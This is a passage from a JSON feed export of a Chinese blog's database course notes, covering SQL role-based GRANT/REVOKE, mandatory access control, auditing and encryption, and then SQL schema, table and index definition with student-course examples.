data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">grant</span> <span class=\"token keyword\">select</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">update</span><span class=\"token punctuation\">,</span><span class=\"token keyword\">insert</span> <span class=\"token keyword\">on</span> Student <span class=\"token keyword\">to</span> R1<span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n<li>\n<p>将这个角色权限授予王平，张明，赵玲，使他们具有角色 R1 所包含的全部权限</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">grant</span> R1 <span class=\"token keyword\">to</span> 王平<span class=\"token punctuation\">,</span>张明<span class=\"token punctuation\">,</span>赵玲<span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n<li>\n<p>通过 R1 一次性收回王平的这三个权限</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">revoke</span> R1 <span class=\"token keyword\">from</span> 王平<span class=\"token punctuation\">;</span></pre></td></tr></table></figure></li>\n</ol>\n<h3 id=\"强取存取控制的方法\"><a class=\"anchor\" href=\"#强取存取控制的方法\">#</a> 强取存取控制的方法</h3>\n<p>自主存取控制缺点：</p>\n<ul>\n<li>可能存在数据的 “无意泄露”</li>\n<li>这种机制仅仅通过对数据的存取权限来进行安全控制，而数据本身并无安全性标记</li>\n<li>解决：对系统控制下的所有主客体实施存取控制策略</li>\n</ul>\n<p>强制存取控制（MAC）</p>\n<ul>\n<li>保证更高的安全性</li>\n<li>用户不能直接感知或进行控制</li>\n<li>适用于对数据有严格而固定密级分类的部门\n<ul>\n<li>军事、政府部门</li>\n</ul>\n</li>\n</ul>\n<p>主体是系统中的活动实体</p>\n<ul>\n<li>DBMS 所管理的实际用户</li>\n<li>代表用户的各进程</li>\n</ul>\n<p>客体是系统中的被动实体，是受主体操纵的</p>\n<ul>\n<li>文件</li>\n<li>基表</li>\n<li>索引</li>\n<li>视图</li>\n</ul>\n<p>敏感读标记（Label）</p>\n<ul>\n<li>绝密（Top Secret）</li>\n<li>机密（Secret）</li>\n<li>可信（Confidential）</li>\n<li>公开（public）</li>\n</ul>\n<p>主体的敏感度标记称为许可证级别（Clearabce Level）</p>\n<p>客体的敏感度标记称为密级（Claccification Level）</p>\n<p>强制存取控制规则</p>\n<ol>\n<li>仅当主体的许可证级别大于或等于客体的密级时，该主体才能读取相应的客体</li>\n<li>仅当主体的许可证级别小于或等于客体的密级时，该主体才能写相应的客体</li>\n</ol>\n<h2 id=\"审计\"><a class=\"anchor\" href=\"#审计\">#</a> 审计</h2>\n<ul>\n<li>\n<p>审计日志</p>\n<p>将用户对数据库的所有操作记录都在上面</p>\n</li>\n<li>\n<p>DBA 利用审计日记</p>\n<p>找出非法存取数据的人，时间和内容</p>\n</li>\n<li>\n<p>C2 以上安全级别的 DBMS 必须具有</p>\n</li>\n</ul>\n<h2 id=\"数据加密\"><a class=\"anchor\" href=\"#数据加密\">#</a> 数据加密</h2>\n<p>数据加密</p>\n<ul>\n<li>防止数据库中数据在存储和传输中失密的有效手段</li>\n</ul>\n<p>加密的基本思想</p>\n<ul>\n<li>根据一定的算法将原始数据（明文）变换为不可直接识别的格式（密文）, 从而使得不知道解密算法的人无法获知数据的内容.</li>\n</ul>\n<p>数据加密分类</p>\n<ul>\n<li>存储加密</li>\n<li>传输加密</li>\n</ul>\n",
            "tags": [
                "数据库",
                "数据库"
            ]
        },
        {
            "id": "https://blog.xcu.icu/2022/12/03/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL/",
            "url": "https://blog.xcu.icu/2022/12/03/%E5%85%B3%E7%B3%BB%E6%95%B0%E6%8D%AE%E5%BA%93%E6%A0%87%E5%87%86%E8%AF%AD%E8%A8%80SQL/",
            "title": "关系数据库标准语言SQL",
            "date_published": "2022-12-02T16:00:00.000Z",
            "content_html": "<h2 id=\"前言\"><a class=\"anchor\" href=\"#前言\">#</a> 前言</h2>\n<p>本篇记录学习数据库的第三章，SQL（结构化查询语言）是关系数据的标准语言，也是一个通用的功能性极强的关系性数据库语言，虽然说是查询语言，但是其功能包括但不仅限于数据库数据查询，而是包含了数据库创建，数据库数据的插入，删除，修改和完整性安全性定义等一系列操作。</p>\n<h2 id=\"sql概述\"><a class=\"anchor\" href=\"#sql概述\">#</a> SQL 概述</h2>\n<p>前面也有提到，SQL 是结构化查询语言，是关系数据库的标准语言，一个通用的，功能性极强的关系型数据库语言。这里可能会对什么是结构化查询语言的概念比较懵</p>\n<p>结构化查询语言是一种数据库查询和程序设计语言，用于存取数据以及查询、更新和管理关系数据库系统；同时也是数据库脚本文件的扩展名。结构化查询语言是高级的非过程化编程语言，允许用户在高层数据结构上工作。</p>\n<h3 id=\"sql的产生\"><a class=\"anchor\" href=\"#sql的产生\">#</a> SQL 的产生</h3>\n<p>SQL 是 1974 年由 Boyce 和 Chamberlin 提出的，最初叫 sequel，并在 IBM 公司研制的关系数据库管理系统原型 System R 上实现。由于 SQL <code>简单易学</code> ， <code>功能丰富</code> ，深受用户及计算机工业界欢迎，因此被数据库厂商所采用。经各公司的不断修改、扩充和完善，SQL 得到业界的认可。</p>\n<p>目前，没有一个数据库系统能够支持 SQL 标准化的所有概念和特性。同时，许多的厂商对 SQL 基本命令集群进行了不同程度的扩充和修改，使其可以支持更多的功能特性，因此我们在具体使用某个产品的时候，阅读用户手册不可或缺。</p>\n<h3 id=\"sql的特点\"><a class=\"anchor\" href=\"#sql的特点\">#</a> SQL 的特点</h3>\n<ol>\n<li>\n<p>综合统一</p>\n<ul>\n<li>\n<p>集数据定义语言（DDL），数据查询语言（DQL），数据操作语言（DML），数据控制语言（DCL）功能于一体。</p>\n</li>\n<li>\n<p><strong>可以独立完成数据库生命周期中的全部活动</strong></p>\n<p>包括定义关系模式、插入数据建立数据库、查询、更新、维护、数据库重构、数据库安全性控制等一系列操作</p>\n</li>\n</ul>\n</li>\n<li>\n<p>高度非过程化</p>\n<p>SQL 只要提出做什么，无须了解存取路径（存取路径的选取由系统自动完成）</p>\n</li>\n<li>\n<p>面向集合的操作方式</p>\n</li>\n<li>\n<p>意同一种语法结构提供两种使用方法</p>\n<p>（SQL 即是自含式语言，又是嵌入式语言）</p>\n</li>\n<li>\n<p>语言简介，易学易用（等于没说【小声哔哔】）</p>\n<p>SQL 中完成核心功能只有 9 个动词</p>\n<table>\n<thead>\n<tr>\n<th>SQL 功能</th>\n<th>动词</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>数据查询</td>\n<td>SELECT</td>\n</tr>\n<tr>\n<td>数据定义</td>\n<td>CREATE，DROP，ALTER</td>\n</tr>\n<tr>\n<td>数据操纵</td>\n<td>INSERT，UPDATE，DELETE</td>\n</tr>\n<tr>\n<td>数据控制</td>\n<td>GRANT，REVOKE</td>\n</tr>\n</tbody>\n</table>\n</li>\n</ol>\n<h3 id=\"sql基本概念\"><a class=\"anchor\" href=\"#sql基本概念\">#</a> SQL 基本概念</h3>\n<p>支持 SQL 的关系数据库管理系统同样支持关系数据库的三级模式</p>\n<ul>\n<li>外模式对应视图和部分基本表</li>\n<li>模式对应基本表</li>\n<li>内模式对应存储文件</li>\n</ul>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221130165919850.png\" alt=\"image-20221130165919850\" /></p>\n<ol>\n<li>\n<p>基本表</p>\n<ul>\n<li>\n<p>本身独立存在的表</p>\n</li>\n<li>\n<p>SQL 中一个关系就对应一个基本表</p>\n</li>\n<li>\n<p>一个（或多个）基本表对应一个储存文件</p>\n</li>\n</ul>\n</li>\n<li>\n<p>存储文件</p>\n<ul>\n<li>物理结构组成了关系数据库的内模式</li>\n<li>物理结构是任意的，对用户透明</li>\n</ul>\n</li>\n<li>\n<p>视图</p>\n<ul>\n<li>从一个或几个基本表导出的表</li>\n<li>数据库中只存放视图的定义没有对应的数据</li>\n<li>视图是一个虚表</li>\n<li>用户可以在视图上面再定义视图</li>\n</ul>\n</li>\n</ol>\n<h2 id=\"数据定义\"><a class=\"anchor\" href=\"#数据定义\">#</a> 数据定义</h2>\n<p>因关系数据库支持三级模式结构，其模式、内模式、外模式中的基本对象有模式，表，视图和索引，故 SQL 的数据定义功能包括模式定义，表定义，视图和索引的定义。</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221130173020187.png\" alt=\"image-20221130173020187\" /></p>\n<p>注：一个关系数据库管理系统的实例中可以创建多个数据库，一个数据库里可以创建多个模式，一个模式通常包括多个表，视图和索引等数据库对象。</p>\n<h3 id=\"模式的定义和删除\"><a class=\"anchor\" href=\"#模式的定义和删除\">#</a> 模式的定义和删除</h3>\n<p><code>定义模式</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">SCHEMA</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token keyword\">AUTHORIZATION</span> <span class=\"token operator\">&lt;</span>用户名<span class=\"token operator\">></span>；</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">schema</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token keyword\">authorization</span> <span class=\"token operator\">&lt;</span>用户名<span class=\"token operator\">></span>；</pre></td></tr></table></figure><p>至于这里为什么要写两遍，SQL 语言是不区分大小写的，两种都行个人喜欢小写</p>\n<p><code>注：</code></p>\n<ol>\n<li><code>如果没有指定&lt;模式名&gt;，则&lt;模式名&gt;隐含为&lt;用户名&gt;</code></li>\n<li><code>调用该命令的用户需要有数据库管理员的权限，或者被授予create schema的权限</code></li>\n</ol>\n<p>这里的定义模式其实就是定义了一个命名空间，可以进一步的创建表，视图</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">SCHEMA</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token keyword\">AUTHORIZATION</span> <span class=\"token operator\">&lt;</span>用户名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表定义子句<span class=\"token operator\">></span><span class=\"token operator\">|</span><span class=\"token operator\">&lt;</span>视图定义子句<span class=\"token operator\">></span><span class=\"token operator\">|</span><span class=\"token operator\">&lt;</span>授权定义子句<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">schema</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token keyword\">authorization</span> <span class=\"token operator\">&lt;</span>用户名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>表定义子句<span class=\"token operator\">></span><span class=\"token operator\">|</span><span class=\"token operator\">&lt;</span>视图定义子句<span class=\"token operator\">></span><span class=\"token operator\">|</span><span class=\"token operator\">&lt;</span>授权定义子句<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>注：这里的[]表示这部分可以没有</code></p>\n<p>例如，如果要为用户 zhang 创建一个模式 test，并且在其中定义一个表 TAB1</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">SCHEMA</span> TEST <span class=\"token keyword\">AUTHORIZATION</span> zhang <span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> TAB1<span class=\"token punctuation\">(</span>COL1 SNALLINT<span class=\"token punctuation\">,</span>COL2 <span class=\"token keyword\">INT</span><span class=\"token punctuation\">,</span>COL3 <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>删除模式</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">SCHEMA</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">CASCADE</span><span class=\"token operator\">|</span><span class=\"token keyword\">RESTRICT</span><span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">drop</span> <span class=\"token keyword\">schema</span> <span class=\"token operator\">&lt;</span>模式名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span><span class=\"token keyword\">cascade</span><span class=\"token operator\">|</span><span class=\"token keyword\">restrict</span><span class=\"token operator\">></span></pre></td></tr></table></figure><p>这里尖括号中的两者必选其一，cascade（级联）表示在删除模式的时候会将该模式下的数据库对象都删除，restrict（限制）如果该模式下面已经定义了数据库对象，则拒绝删除语句的执行。</p>\n<h3 id=\"基本表的定义-删除与修改\"><a class=\"anchor\" href=\"#基本表的定义-删除与修改\">#</a> 基本表的定义、删除与修改</h3>\n<h4 id=\"定义基本表\"><a class=\"anchor\" href=\"#定义基本表\">#</a> 定义基本表</h4>\n<p>使用 create table 语句</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>数据类型<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span>列级完整性约束条件<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>数据类型<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span>列级完整性约束条件<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>····</pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>建立一个学生表Student</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> Student <span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tSno <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/* 表级约束条件～设置主键 */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Sname <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">UNIQUE</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/* 表级约束条件～取唯一值 */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Ssex <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Sage <span class=\"token keyword\">SMALLINT</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    Sdept <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">20</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre><span class=\"token punctuation\">)</span>；</pre></td></tr></table></figure><p><code>建立一个“课程”表Course</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> Course<span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>\tCno <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/* 表级约束条件～设置主键 */</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>    Cname <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">40</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">NOT</span> <span class=\"token boolean\">NULL</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/* 表级约束条件～不能为空 */</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    Cpno <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    Ccredit <span class=\"token keyword\">SMALLINT</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>    <span class=\"token keyword\">FOREIGN</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span>Cpno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">REFERENCES</span> Course<span class=\"token punctuation\">(</span>Cno<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token comment\">/* 表级约束条件，Cpno 是外码，被参照表是 Course，被参照列是 Cno*/</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>注：参照表和被参照表可以是同一个表</code></p>\n<p><code>建立一个学生选课表SC</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token keyword\">TABLE</span> SC</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">(</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>\tSno <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">9</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>\tCno <span class=\"token keyword\">CHAR</span><span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>\tGrade <span class=\"token keyword\">SMALLINT</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>\t<span class=\"token keyword\">PRIMARY</span> <span class=\"token keyword\">KEY</span><span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">,</span>Cno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/* 主码由两个属性组成必须通过表级约束条件来定义 */</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>    <span class=\"token keyword\">FOREIGN</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">REFERENCES</span> Student<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/* 表级约束条件～Sno 是外码，参照表是 Student*/</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>    <span class=\"token keyword\">FOREIGN</span> <span class=\"token keyword\">KEY</span> <span class=\"token punctuation\">(</span>Cno<span class=\"token punctuation\">)</span> <span class=\"token keyword\">REFERENCES</span> Course<span class=\"token punctuation\">(</span>Cno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token comment\">/* 表级约束条件～Cno 是外码，参照表是 Couese*/</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"数据类型\"><a class=\"anchor\" href=\"#数据类型\">#</a> 数据类型</h4>\n<p>在上面基本表的定义中提到了数据类型，关系模型中的每一个属性都来自一个域，他的取值必须是域中的值，在 SQL 中用数据类型来实现</p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221130183148691.png\" alt=\"image-20221130183148691\" /></p>\n<p><img data-src=\"https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20221130183201344.png\" alt=\"image-20221130183201344\" /></p>\n<h4 id=\"模式与表\"><a class=\"anchor\" href=\"#模式与表\">#</a> 模式与表</h4>\n<p>模式与表的关系很简单，每一个表都对应一个模式，一个模式对应多个表</p>\n<h4 id=\"修改基本表\"><a class=\"anchor\" href=\"#修改基本表\">#</a> 修改基本表</h4>\n<p>使用 ALTER TABLE 来修改基本表</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">TABLE</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">ADD</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">COLUMN</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>新列名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>数据类型<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span>完整性约束条件<span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">ADD</span> <span class=\"token operator\">&lt;</span>表级完整性约束条件<span class=\"token operator\">></span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">DROP</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">COLUMN</span><span class=\"token punctuation\">]</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">CASCADE</span><span class=\"token operator\">|</span><span class=\"token keyword\">RESTRICT</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">CONSTRAINT</span> <span class=\"token operator\">&lt;</span>完整性约束<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">RESTRICT</span><span class=\"token operator\">|</span><span class=\"token keyword\">CASCADE</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre><span class=\"token punctuation\">[</span><span class=\"token keyword\">ALTER</span> <span class=\"token keyword\">COLUMN</span> <span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token operator\">&lt;</span>数据类型<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>ADD</code>  用于增加新列、新的完整性约束条件 <code>DROP COLUMN</code>  子句用于删除表中的列，如果指定了 CASCADE 则删除引用了该列的其他对象， <code>DROP CONSTRAINT</code>  用于删除只能怪的完整性约束条件， <code>ALTER COLUMN</code>  子句用于修改原有的列定义</p>\n<p><code>给Student表增加入学时间列，数据类型为日期型</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> Student <span class=\"token keyword\">add</span> S_entrance <span class=\"token keyword\">DATE</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>将年龄的数据类型由字符型改为整型</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> Student <span class=\"token keyword\">alter</span> cloumn Sage <span class=\"token keyword\">INT</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>增加课程名唯一的约束条件</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">alter</span> <span class=\"token keyword\">table</span> Course <span class=\"token keyword\">add</span> <span class=\"token keyword\">unique</span><span class=\"token punctuation\">(</span>Cname<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h4 id=\"删除基本表\"><a class=\"anchor\" href=\"#删除基本表\">#</a> 删除基本表</h4>\n<p>当一个表不需要的时候我们可以通过</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">DROP</span> <span class=\"token keyword\">TABLE</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">RESTRICT</span><span class=\"token operator\">|</span><span class=\"token keyword\">CASCADE</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>删除Student表</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">drop</span> <span class=\"token keyword\">table</span> Student <span class=\"token keyword\">restrict</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><h3 id=\"索引的建立与删除\"><a class=\"anchor\" href=\"#索引的建立与删除\">#</a> 索引的建立与删除</h3>\n<p>索引的目的是加快数据查询的速度</p>\n<p>使用 create index 建立索引</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">CREATE</span> <span class=\"token punctuation\">[</span><span class=\"token keyword\">UNIQUE</span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span>CLUSTER<span class=\"token punctuation\">]</span> <span class=\"token keyword\">INDEX</span> <span class=\"token operator\">&lt;</span>索引名<span class=\"token operator\">></span> <span class=\"token keyword\">ON</span> <span class=\"token operator\">&lt;</span>表名<span class=\"token operator\">></span> <span class=\"token punctuation\">(</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>次序<span class=\"token operator\">></span><span class=\"token punctuation\">]</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">,</span><span class=\"token operator\">&lt;</span>列名<span class=\"token operator\">></span> <span class=\"token punctuation\">[</span><span class=\"token operator\">&lt;</span>次序<span class=\"token operator\">></span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">]</span>···<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>次序中<span class=\"token keyword\">ASC</span>为升序，<span class=\"token keyword\">DESC</span>为降序（默认是<span class=\"token keyword\">ASC</span>）</pre></td></tr></table></figure><p><code>为学生课程数据库中的Student，Course，SC三个表建立索引，其中Student表按照学号升序建立唯一索引，Course表按照课程号升序建立唯一索引，SC表中按照学号升序和课程号降序建立唯一索引</code></p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">unique</span> <span class=\"token keyword\">index</span> Student <span class=\"token keyword\">on</span> Student<span class=\"token punctuation\">(</span>Sno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">unique</span> <span class=\"token keyword\">index</span> Course <span class=\"token keyword\">on</span> Course<span class=\"token punctuation\">(</span>Cno<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">create</span> <span class=\"token keyword\">unique</span> <span class=\"token keyword\">index</span> SC <span class=\"token keyword\">on</span> SC<span class=\"token punctuation\">(</span>Sno <span class=\"token keyword\">ASC</span><span class=\"token punctuation\">,</span>Cno <span class=\"token keyword\">DESC</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></pre></td></tr></table></figure><p><code>注，索引的建立只有建表的人和数据库管理员可以操作，其他的都依靠DBMS自动完成</code></p>\n<h2 id=\"数据查询\"><a class=\"anchor\" href=\"#数据查询\">#</a> 数据查询</h2>\n<p>接下来开始本篇的重点部分，数据的查询其一般格式为：</p>\n<figure class=\"highlight sql\"><figcaption data-lang=\"SQL\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token 